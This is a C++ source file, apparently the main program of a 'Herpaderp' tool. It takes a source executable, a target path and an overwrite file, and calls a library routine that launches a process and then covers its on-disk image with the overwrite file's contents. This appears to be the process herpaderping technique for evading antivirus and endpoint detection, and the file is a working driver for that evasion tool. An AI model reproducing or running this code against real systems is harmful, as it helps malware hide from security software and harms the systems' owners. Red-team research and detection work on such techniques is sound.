#include <iostream>
#include "./lib/utils.h"
#include "./lib/herpaderp.h"

int wmain(int argc, const wchar_t* argv[])
{
    LPCWSTR sourceFileName = argv[1];
    LPCWSTR targetFileName = argv[2];
    LPCWSTR overwriteFileName = argv[3];

    if (!sourceFileName || !targetFileName || !overwriteFileName) {
        printf("[*] Usage: Herpaderp.exe <SOURCE_FILE> <TARGET_FILE> <OVERWRITE_FILE>\n");
        return -1;
    }

    HANDLE overwriteFile = CreateFileW(
        overwriteFileName,
        GENERIC_READ,
        FILE_SHARE_READ,
        0,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        0
    );

    DWORD bufferSize;
    auto buffer = herpaderp::readFile(overwriteFile, bufferSize);

    if (!buffer || bufferSize == 0)
        printf("[-] Failed To Read Overwrite File.\n");
    else
        printf("[+] Read Overwrite File.\n");

    auto resInfo = herpaderp::herpaderp(
        sourceFileName, // sourceFileName
        targetFileName, // targetFileName
        NtCurrentProcess, // parentProcess
        (PBYTE)buffer, // overwriteBuffer
        bufferSize // overwriteBufferSize
    );

    if (herpaderp::succeeded(resInfo))
        printf("[+] Process Herpaderped!, Process PID: %ld\n", GetProcessId(resInfo.process));

    free(buffer); // buffer is allocated by malloc, don't forget to free it, You can change this to use a unique pointer instead.
}
